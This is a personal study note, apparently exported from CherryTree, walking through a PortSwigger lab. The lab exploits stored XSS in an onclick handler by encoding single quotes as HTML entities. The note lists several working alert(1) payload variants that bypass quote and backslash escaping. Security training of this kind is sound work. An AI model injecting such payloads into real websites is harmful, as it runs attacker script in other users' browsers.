<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped</h1><br/>XSS:<br />• into onclick event<br />• angle brackets (&lt;&gt;) HTML encoded<br />• double quotes HTML encoded<br />• single quotes (&#39;) escaped<br />• backslash (\) escaped<br /><br /><br />The HTML encoded characters inside the value of HTML tags attributes are decoded on runtime.<br /><br />1. Post a comment with a <span style="color:#ff0000;">random alphanumeric string </span><span style="color:#ff0000;text-decoration:underline;">in the &quot;Website&quot; input</span>, then check:<br />   ◇ the source code of the WebApp<br />       <a href=""><img src="images/1959-1.png" alt="images/1959-1.png" /></a><br />   ◇ the response of Burp<br />       <a href=""><img src="images/1959-2.png" alt="images/1959-2.png" /></a><br />2. Observe that the <span style="color:#ff0000;">random string</span> in the second has been reflected inside an <span style="color:#ffa500;">onclick event handler attribute</span>.<br />3. Repeat the process again but this time modify the <span style="color:#ff0000;">&quot;Website&quot; input</span> to inject a JavaScript URL that calls alert,<br />    <div class="codebox"><pre>http:<span style="color:#0088ff;font-weight:400">//foo?[PAYLOAD]</span></pre></div><br />    Because we cannot use the single quotation mark (&#39;) because it is escaped by the webapp <br />    <a href=""><img src="images/1959-3.png" alt="images/1959-3.png" /></a><br />    we will use the entities of the quotation mark (&#39;) :<br />    <table class="table"><tr><th>HTML character</th><th>Entity Name</th><th>Entity Decimal Number</th><th>Entity Decimal Number (with zeros)</th><th>Entity Hex Number</th><th>Entity Hex Number (with zeros)</th></tr><tr><td>&#39;</td><td>&amp;apos;</td><td>&amp;#39;</td><td>&amp;#00039</td><td>&amp;#x27;</td><td>&amp;#x00027;</td></tr></table><br />    using one of the following payloads: <br />    <div class="codebox"><pre><span style="color:#0088ff;font-weight:400">//HTML entities</span><br />&amp;apos;-alert(<span style="color:#ff0044;font-weight:400">1</span>)-&amp;apos;<br /><span style="color:#0088ff;font-weight:400">//HTML hex number</span><br />&amp;#x27;-alert(<span style="color:#ff0044;font-weight:400">1</span>)-&amp;#x27;<br />&amp;#x27-alert(<span style="color:#ff0044;font-weight:400">1</span>)-&amp;#x27<br /><span style="color:#0088ff;font-weight:400">//HTML hex with zeros</span><br />&amp;#x00027;-alert(<span style="color:#ff0044;font-weight:400">1</span>)-&amp;#x00027;<br />&amp;#x00027-alert(<span style="color:#ff0044;font-weight:400">1</span>)-&amp;#x00027<br /><span style="color:#0088ff;font-weight:400">//HTML dec</span><br />&amp;#<span style="color:#ff0044;font-weight:400">39</span>;-alert(<span style="color:#ff0044;font-weight:400">1</span>)-&amp;#<span style="color:#ff0044;font-weight:400">39</span>;<br />&amp;#<span style="color:#ff0044;font-weight:400">39</span>-alert(<span style="color:#ff0044;font-weight:400">1</span>)-&amp;#<span style="color:#ff0044;font-weight:400">39</span><br /><span style="color:#0088ff;font-weight:400">//HTML dec with zeros</span><br />&amp;#00039;-alert(<span style="color:#ff0044;font-weight:400">1</span>)-&amp;#00039;<br />&amp;#00039-alert(<span style="color:#ff0044;font-weight:400">1</span>)-&amp;#00039<br /></pre></div><br />    <a href=""><img src="images/1959-4.png" alt="images/1959-4.png" /></a><br /><br /><br /><br /><br /><br /><br /><br />Bibliography:<br /><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped">https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped</a><br /><a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting">https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting</a><br /><a href="https://www.w3schools.com/html/html_entities.asp">https://www.w3schools.com/html/html_entities.asp</a></div>
</body>
</html>
